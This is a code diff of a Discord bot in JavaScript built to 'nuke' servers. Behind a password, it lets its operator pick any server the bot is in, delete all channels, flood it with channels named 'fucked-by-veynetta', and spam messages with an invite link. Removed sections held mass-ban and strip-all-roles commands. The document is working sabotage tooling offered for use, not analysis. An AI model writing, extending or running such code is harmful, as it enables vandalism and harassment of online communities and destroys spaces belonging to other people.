@@ -49,51 +49,17 @@ client.on('messageCreate', async message => {
     const embed = new EmbedBuilder()
       .setColor('#00ff00')
       .setTitle('🔍 Remote Server Control')
-      .setDescription('Select server → Nuke')
-      .setFooter({ text: 'Only you can use this' });
+      .setDescription('Select any server the bot is in to nuke it.')
+      .setFooter({ text: 'Click below' });
 
     const row = new ActionRowBuilder().addComponents(
       new ButtonBuilder()
         .setCustomId(`check_start_${message.author.id}`)
-        .setLabel('Start')
+        .setLabel('Enter Password')
         .setStyle(ButtonStyle.Primary)
     );
 
-    return message.reply({ embeds: [embed], components: [row] });
-  }
-
-  if (content === '!banall') {
-    const embed = new EmbedBuilder()
-      .setColor('#ff0000')
-      .setTitle('🚫 BAN EVERYONE')
-      .setDescription('This will ban all members (except you and the bot). Password required.')
-      .setFooter({ text: 'Destructive action' });
-
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId(`banall_start_${message.author.id}`)
-        .setLabel('Enter Password')
-        .setStyle(ButtonStyle.Danger)
-    );
-
-    return message.reply({ embeds: [embed], components: [row] });
-  }
-
-  if (content === '!removeroles') {
-    const embed = new EmbedBuilder()
-      .setColor('#ff8800')
-      .setTitle('🗑️ REMOVE ALL ROLES')
-      .setDescription('This will remove all roles from everyone except admins and the bot.')
-      .setFooter({ text: 'Destructive action' });
-
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId(`removeroles_start_${message.author.id}`)
-        .setLabel('Enter Password')
-        .setStyle(ButtonStyle.Danger)
-    );
-
-    return message.reply({ embeds: [embed], components: [row] });
+    await message.reply({ embeds: [embed], components: [row] });
   }
 });
 
@@ -110,7 +76,7 @@ client.on('interactionCreate', async interaction => {
       return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
     }
 
-    // ====================== NUKE ======================
+    // ====================== !CHECK FLOW ======================
     if (action === 'check') {
       if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
         const modal = new ModalBuilder()
@@ -124,9 +90,13 @@ client.on('interactionCreate', async interaction => {
 
       if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
         const password = interaction.fields.getTextInputValue('password');
-        if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
+        if (password !== MAIN_PASSWORD) {
+          return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
+        }
 
         const guilds = Array.from(client.guilds.cache.values());
+        if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is not in any servers.', flags: MessageFlags.Ephemeral });
+
         const options = guilds.map(g => ({
           label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
           value: g.id
@@ -134,15 +104,14 @@ client.on('interactionCreate', async interaction => {
 
         const select = new StringSelectMenuBuilder()
           .setCustomId(`check_server_select_${interaction.user.id}`)
-          .setPlaceholder('Select server')
+          .setPlaceholder('Select server to nuke')
           .addOptions(options);
 
         await interaction.reply({
-          content: '✅ Password accepted. Select server:',
+          content: '✅ Password correct. Select server:',
           components: [new ActionRowBuilder().addComponents(select)],
           flags: MessageFlags.Ephemeral
         });
-        userSessions.set(interaction.user.id, {});
       }
 
       if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
@@ -156,7 +125,7 @@ client.on('interactionCreate', async interaction => {
           .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
 
         await interaction.editReply({
-          content: `**Selected:** ${guild.name}`,
+          content: `**Selected Server:** ${guild.name}\nChoose action:`,
           components: [new ActionRowBuilder().addComponents(actionSelect)]
         });
       }
@@ -187,18 +156,20 @@ client.on('interactionCreate', async interaction => {
         const invite = 'https://discord.gg/veynettas';
 
         try {
-          await interaction.editReply({ content: `☢️ Nuking **${guild.name}**...` });
+          await interaction.editReply({ content: `☢️ Deleting all channels in **${guild.name}**...` });
 
-          // Delete channels
           for (const ch of guild.channels.cache.values()) {
             await ch.delete().catch(() => {});
             await delay(400);
           }
 
-          // Create channels
-          for (let i = 0; i < 15; i++) {
+          await interaction.editReply({ content: '🔨 Creating fucked-by-veynetta channels...' });
+
+          let created = 0;
+          for (let i = 0; i < 12; i++) {
             try {
               await guild.channels.create({ name: 'fucked-by-veynetta', type: 0 });
+              created++;
               await delay(700);
             } catch {}
           }
@@ -207,85 +178,19 @@ client.on('interactionCreate', async interaction => {
           const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');
 
           for (const ch of channels.values()) {
-            for (let i = 0; i < 10; i++) ch.send(spamText).catch(() => {});
+            for (let i = 0; i < 8; i++) ch.send(spamText).catch(() => {});
           }
 
-          await interaction.editReply({ content: `✅ Nuke finished on **${guild.name}**. Created \`fucked-by-veynetta\` channels.` });
+          await interaction.editReply({ 
+            content: `✅ **NUKE COMPLETE**\nCreated **${created}** channels named \`fucked-by-veynetta\`` 
+          });
+
         } catch (err) {
           console.error(err);
           await interaction.editReply({ content: '⚠️ Nuke partially completed.' }).catch(() => {});
         }
 
         userSessions.delete(interaction.user.id);
-      }
-    }
-
-    // ====================== BAN ALL ======================
-    if (action === 'banall') {
-      if (interaction.isButton() && interaction.customId.startsWith('banall_start_')) {
-        const modal = new ModalBuilder()
-          .setCustomId(`banall_modal_${interaction.user.id}`)
-          .setTitle('BAN ALL PASSWORD');
-        modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-        ));
-        return await interaction.showModal(modal);
-      }
-
-      if (interaction.isModalSubmit() && interaction.customId.startsWith('banall_modal_')) {
-        const password = interaction.fields.getTextInputValue('password');
-        if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
-
-        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
-
-        const guild = interaction.guild;
-        let banned = 0;
-
-        const members = await guild.members.fetch();
-        for (const member of members.values()) {
-          if (member.user.bot || member.id === interaction.user.id || member.id === client.user.id) continue;
-          try {
-            await member.ban({ reason: 'Fame Takeover' });
-            banned++;
-            await new Promise(r => setTimeout(r, 600));
-          } catch {}
-        }
-
-        await interaction.editReply({ content: `✅ Banned **${banned}** members.` });
-      }
-    }
-
-    // ====================== REMOVE ALL ROLES ======================
-    if (action === 'removeroles') {
-      if (interaction.isButton() && interaction.customId.startsWith('removeroles_start_')) {
-        const modal = new ModalBuilder()
-          .setCustomId(`removeroles_modal_${interaction.user.id}`)
-          .setTitle('REMOVE ROLES PASSWORD');
-        modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-        ));
-        return await interaction.showModal(modal);
-      }
-
-      if (interaction.isModalSubmit() && interaction.customId.startsWith('removeroles_modal_')) {
-        const password = interaction.fields.getTextInputValue('password');
-        if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
-
-        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
-
-        const guild = interaction.guild;
-        let removed = 0;
-
-        const members = await guild.members.fetch();
-        for (const member of members.values()) {
-          if (member.user.bot || member.permissions.has('Administrator')) continue;
-          try {
-            await member.roles.set([]);
-            removed++;
-          } catch {}
-        }
-
-        await interaction.editReply({ content: `✅ Removed roles from **${removed}** members.` });
       }
     }
 
